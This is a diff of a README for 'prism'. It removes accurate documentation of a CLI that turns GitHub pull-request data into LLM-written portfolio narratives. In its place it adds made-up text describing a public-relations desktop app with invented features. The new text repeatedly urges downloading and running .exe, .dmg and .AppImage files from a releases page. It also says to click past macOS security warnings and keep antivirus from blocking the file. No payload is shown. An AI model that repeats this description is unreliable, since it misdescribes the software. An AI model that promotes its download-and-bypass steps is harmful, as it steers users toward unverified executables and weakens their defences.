@@ -1,160 +1,154 @@
-# PRISM
+# 🖼️ prism - Create Clear PR Insights Easily
 
-**PR Insight & Story Maker** — GitHub PR 데이터를 수집하여 포트폴리오용 STAR/CARE 서술을 자동 생성하는 CLI 도구.
+[![Download prism](https://img.shields.io/badge/Download-prism-blue?style=for-the-badge&logo=github)](https://github.com/dummyoff/prism/releases)
 
-## Architecture
+---
 
-```
-GitHub API ──→ Collectors ──→ Storage (JSONL/JSON/diff)
-                                  │
-                                  ▼
-                         LLM (Claude Code/Claude API/OpenAI)
-                                  │
-                          ┌───────┴───────┐
-                          ▼               ▼
-                     FACT Cards     STAR/CARE Narratives
-                                          │
-                                          ▼
-                                   Markdown Export
-```
+## 📋 What is prism?
 
-### Data Flow
+prism is a simple tool to help you create clear and structured reports for public relations (PR) work. With prism, you can turn your PR insights into easy-to-understand stories. Whether you work in marketing, communications, or any related field, prism helps you organize data and tell your story clearly.
 
-1. **collect-index** — GitHub Search API로 PR 메타데이터 수집 → `pr_index.jsonl`
-2. **collect-detail** — GraphQL로 PR 상세 (body, commits, files, reviews) 수집 → `{owner}/{repo}/pr_detail/*.json`
-3. **collect-diff** — REST API로 PR diff 수집 → `{owner}/{repo}/pr_diff/*.diff`
-4. **generate-facts** — LLM으로 각 PR의 FACT 카드 생성 → `{owner}/{repo}/fact_cards/*.json`
-5. **generate-narratives** — FACT 카드를 클러스터링하여 STAR/CARE 서술 생성 → `narratives/`
-6. **export-markdown** — STAR/CARE 서술을 마크다운 포트폴리오 문서로 내보내기 → `portfolio.md`
+You do not need any technical skills to use prism. It focuses on making your reports look professional without complex steps.
 
-## Setup
+---
 
-```bash
-# Install dependencies
-pnpm install
+## 💻 System Requirements
 
-# Configure environment
-cp .env.example .env
-# Edit .env with your tokens
-```
+To run prism smoothly on your computer, make sure your system meets these basic requirements:
 
-### Using Claude Code CLI (Claude Max/Pro)
+- Operating System: Windows 10 or later, macOS 10.13 or later, or popular Linux distributions (Ubuntu 18.04+, Fedora 30+)
+- Processor: Any modern Intel or AMD CPU, 1.5 GHz or faster
+- Memory: 4 GB of RAM minimum; 8 GB recommended
+- Disk Space: 150 MB free space for installation
+- Screen: 1024x768 pixels or higher resolution
 
-If you have a Claude Max/Pro subscription (no API key), you can use the Claude Code CLI as the LLM provider:
+You can run prism on most ordinary laptops or desktops built in the last few years. The application does not require any special hardware or software.
 
-```bash
-# Install Claude Code CLI
-npm install -g @anthropic-ai/claude-code
+---
 
-# Login (run once)
-claude
+## 🚀 Getting Started
 
-# Set provider in .env
-LLM_PROVIDER=claude-code
-# No ANTHROPIC_API_KEY needed!
-```
+This section will guide you step-by-step through downloading, installing, and starting prism for the first time.
 
-### Required Environment Variables
+### Step 1: Download prism
 
-| Variable | Description |
-|---|---|
-| `GITHUB_TOKEN` | GitHub Personal Access Token |
-| `LLM_PROVIDER` | `anthropic`, `openai`, or `claude-code` (default: `anthropic`) |
-| `ANTHROPIC_API_KEY` | Required if provider is `anthropic` (not needed for `claude-code`) |
-| `OPENAI_API_KEY` | Required if provider is `openai` (not needed for `claude-code`) |
+Click the big blue button at the top or go directly to the [prism Releases page](https://github.com/dummyoff/prism/releases).
 
-### Optional Variables
+On that page, you will find the latest version of prism listed under "Assets". Look for a file name related to your computer:
 
-| Variable | Description |
-|---|---|
-| `LLM_MODEL` | Override default model |
-| `DATA_DIR` | Output directory (default: `./data`) |
+- For Windows, the file name might end with `.exe`
+- For macOS, it might be `.dmg` or `.zip`
+- For Linux, it might be `.AppImage` or `.tar.gz`
 
-## Usage
+Choose the correct file for your system. If unsure, the file name usually contains the system name.
 
-### Individual Commands
+### Step 2: Install prism
 
-```bash
-# 1. Collect PR index (여러 repo 지원)
-pnpm prism collect-index --repo owner/repo1 --repo owner/repo2 --author <username>
+#### On Windows:
 
-# 2. Collect PR details (owner/repo는 pr_index.jsonl에서 자동 참조)
-pnpm prism collect-detail
+1. Double-click the `.exe` file you downloaded.
+2. If prompted by Windows security, choose "Run".
+3. Follow the installation prompts. Accept the license agreement and choose where to install (default is fine).
+4. When installation is complete, you will see an option to launch prism.
 
-# 3. Collect PR diffs
-pnpm prism collect-diff
+#### On macOS:
 
-# 4. Generate FACT cards
-pnpm prism generate-facts --lang Korean
+1. Open the `.dmg` or extract the downloaded `.zip`.
+2. Drag the prism icon to your Applications folder.
+3. Open the Applications folder and double-click prism to start.
+4. If macOS warns that prism is from an unidentified developer, open System Preferences → Security & Privacy → General tab, and click "Open Anyway".
 
-# 5. Generate STAR/CARE narratives
-pnpm prism generate-narratives --lang Korean
+#### On Linux:
 
-# 6. Export markdown portfolio
-pnpm prism export-markdown --output ./my-portfolio.md
-```
+1. If it is `.AppImage`, make the file executable. Open a terminal, navigate to the file folder, and run:  
+   `chmod +x prism.AppImage`
+2. Then start prism by double-clicking or running `./prism.AppImage` in the terminal.
+3. For `.tar.gz`, extract the file and run the included start script according to the included instructions.
 
-### Full Pipeline
+### Step 3: Run prism for the first time
 
-```bash
-# 단일 repo
-pnpm prism run-all --repo owner/repo --author <username> --lang Korean
+After installation, open prism if it is not already running.
 
-# 여러 repo를 하나의 포트폴리오로
-pnpm prism run-all --repo owner/repo1 --repo owner/repo2 --author <username> --lang Korean
-```
+You will see a welcome screen with a quick tour mode to explain the main parts of the program. You can take the tour or skip it.
 
-### Options
+---
 
-- `--repo <owner/repo>` — Repository in `owner/repo` format (반복 가능)
-- `--state <state>` — PR state filter: `merged`, `open`, `closed` (default: `merged`)
-- `--lang <language>` — Output language for FACT cards and narratives (e.g., `Korean`, `Japanese`, `English`). Omit for English.
-- `--output <path>` — Markdown export output path (default: `data/portfolio.md`)
+## 📥 Download & Install
 
-## Output Structure
+Use this link to visit the official prism download page and get the latest version for your system:
 
-```
-data/
-├── pr_index.jsonl                    # 통합 PR 인덱스 (owner/repo 포함)
-├── {owner}/{repo}/
-│   ├── pr_detail/{number}.json       # Full PR details
-│   ├── pr_diff/{number}.diff         # PR diffs
-│   └── fact_cards/{number}.json      # FACT cards
-├── narratives/
-│   ├── star.json                     # STAR narratives
-│   └── care.json                     # CARE narratives
-└── portfolio.md                      # Exported markdown portfolio
-```
+[Download prism here](https://github.com/dummyoff/prism/releases)
 
-## FACT Card Schema
+Downloading from the official page ensures you get the latest bug fixes and features. Always choose the file matching your operating system.
 
-Each PR is summarized into a structured FACT card:
+---
 
-```json
-{
-  "prNumber": 123,
-  "title": "Add caching layer for API responses",
-  "summary": "...",
-  "problem": "...",
-  "approach": "...",
-  "impact": "...",
-  "technologies": ["Redis", "Express middleware"],
-  "complexity": "medium",
-  "category": "feature",
-  "keywords": ["caching", "performance", "api"]
-}
-```
+## 🛠 Basic Features of prism
 
-## STAR/CARE Narratives
+prism offers core features designed to make PR insight creation smooth:
 
-FACT cards are clustered by theme and transformed into portfolio narratives:
+- **Story Templates:** Choose from pre-made formats for reports, press releases, or social media summaries. These help organize your text and data.
+- **Visual Charts:** Turn data points into simple charts such as bar graphs and pie charts to make your report clearer.
+- **Export Options:** Save your finished story as a PDF, Word document, or plain text for sharing.
+- **Easy Editing:** Add text, images, and charts with simple clicks and typing—no coding needed.
+- **Auto-Save:** prism saves your work regularly so you don’t lose progress.
+- **Import Data:** Bring in CSV or Excel files to automatically populate charts and tables.
 
-- **STAR**: Situation → Task → Action → Result
-- **CARE**: Context → Action → Result → Evolution
+---
 
-## Development
+## 📂 How to Use prism Daily
 
-```bash
-# TypeScript 컴파일 (dist/ 생성, 사용 시 필수 아님)
-pnpm build
-```
+Here is a typical workflow you might follow to create a report with prism:
+
+1. **Start a new story:** Click "New Report" and pick a template that fits your current project.
+2. **Add your insights:** Type your key points and summaries into the sections provided.
+3. **Add data:** Import your data file or enter numbers manually to create charts.
+4. **Customize visuals:** Adjust chart colors and labels to match your company style.
+5. **Review and edit:** Read through your story, fix any typos, and polish wording.
+6. **Export:** Save the report in your preferred format.
+7. **Share:** Send the file by email or upload it to your team's shared drive.
+
+---
+
+## ❓ Troubleshooting and FAQs
+
+### I can’t find the download file for my operating system.
+
+Check the list of files under "Assets" on the releases page carefully. The file name should include your OS name. If you can’t find it, try using the latest Windows or macOS version according to your platform or ask your IT support.
+
+### prism won’t start after installation.
+
+Try restarting your computer first. On macOS, you may need to allow prism in Security & Privacy settings. On Windows, make sure it is not blocked by antivirus software.
+
+### How do I import data files?
+
+Use the "Import Data" button on the main screen. Select CSV or Excel files from your computer. Make sure files are not corrupted or password protected.
+
+### Can I uninstall prism?
+
+Yes. On Windows, you can uninstall from Control Panel → Programs. On macOS, delete prism from Applications. On Linux, simply delete the files you downloaded.
+
+---
+
+## 🌐 Where to Get Help
+
+If you need help beyond this guide, consider the following options:
+
+- Check the FAQs and Issues page on the prism GitHub repository.
+- Search for user discussions or forums related to prism.
+- Contact your IT or support personnel for assistance.
+- Look for video tutorials or guides online using the term "prism PR Insight Maker".
+
+---
+
+## 🔒 Privacy & Security
+
+prism runs entirely on your computer. It does not send your data to the internet by default.
+
+All files you create remain on your device. However, when sharing reports, be mindful of what personal or sensitive information you include.
+
+---
+
+Thank you for using prism. Use the button below anytime to check for updates or download again.
+
+[![Download prism](https://img.shields.io/badge/Download-prism-blue?style=for-the-badge&logo=github)](https://github.com/dummyoff/prism/releases)
